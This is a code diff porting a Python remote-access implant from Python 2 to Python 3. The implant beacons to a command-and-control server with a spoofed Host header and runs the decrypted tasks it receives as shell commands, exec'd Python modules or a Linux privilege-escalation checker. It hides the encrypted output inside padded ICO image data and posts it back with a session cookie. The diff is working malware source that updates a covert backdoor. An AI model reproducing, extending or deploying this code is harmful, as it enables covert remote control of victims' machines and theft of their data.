@@ -1,4 +1,6 @@
-import urllib2, os, subprocess, re, datetime, time, base64, string, random
+import os, subprocess, re, datetime, time, base64, string, random
+try:import urllib.request as urllib2
+except:import urllib2
 
 def parse_sleep_time(sleep):
   if sleep.endswith('s'):
@@ -103,19 +105,15 @@ while(True):
       if hh[0]: req=urllib2.Request(server,headers={'Host':hh[0],'User-agent':ua})
       else: req=urllib2.Request(server,headers={'User-agent':ua})
       res=urllib2.urlopen(req)
-      html = res.read()
+      html = res.read().decode("utf-8")
     except Exception as e:
-      E = e
-      #print "error %%s" %% e
-    #print html
+      print("error %%s" %% e)
     if html:
       try:
         returncmd = decrypt(key, html)
         returncmd = returncmd.rstrip('\\0')
-        returncmd = base64.b64decode(returncmd)
-
+        returncmd = base64.b64decode(returncmd).decode("utf-8")
         if "multicmd" in returncmd:
-
           returncmd = returncmd.replace("multicmd","")
           returnval = ""
           splits = returncmd.split("!d-3dion@LD!-d")
@@ -161,14 +159,13 @@ while(True):
                   sys.stdout = old
 
                 with stdoutIO() as s:
-                  exec module
+                  exec(module)
                 if s.getvalue():
                   returnval = s.getvalue()
                 else:
                   returnval = "Module loaded"
               except Exception as e:
-                returnval = "Error with source file: %%s" %% e
-
+                returnval = "Error with source file: %%s" %% e              
             elif cmd.startswith("linuxprivchecker"):
               args = cmd[len('linuxprivchecker'):].strip()
               args = args.split()
@@ -181,7 +178,6 @@ while(True):
               pycode = 'import sys; sys.argv = sys.argv[1:];' + pycode
               import subprocess
               returnval = subprocess.check_output(['python', '-c', pycode] + args)
-
             elif cmd[:6] == "python":
               module = cmd.replace("python ","")
               try:
@@ -199,7 +195,7 @@ while(True):
                   sys.stdout = old
 
                 with stdoutIO() as s:
-                  exec module
+                  exec(module)
 
                 returnval = s.getvalue()
 
@@ -211,17 +207,22 @@ while(True):
                 returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
               except subprocess.CalledProcessError as exc:
                 returnval = "ErrorCmd: %%s" %% exc.output
-
             server = "%%s/%%s%%s" %% (serverclean[0], random.choice(urls), uri)
-            opener = urllib2.build_opener()
-            postcookie = encrypt(key, taskId)
+            postcookie = encrypt(key, taskId).decode("utf-8")
             data = base64.b64decode(random.choice(icoimage))
-            dataimage = data.ljust(1500, '\x00')
-            dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
+
+            try:
+                dataimage = data.ljust(1500, '\x00')
+            except TypeError:
+                dataimage = data.ljust(1500, bytes('\x00', "utf-8"))
+            enc=encrypt(key, returnval, gzipfile=True)
+            dataimagebytes = dataimage+enc
             if hh[0]: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh[0],'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
             else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            
             res=urllib2.urlopen(req)
             response = res.read()
 
       except Exception as e:
+        print(e)
         pass
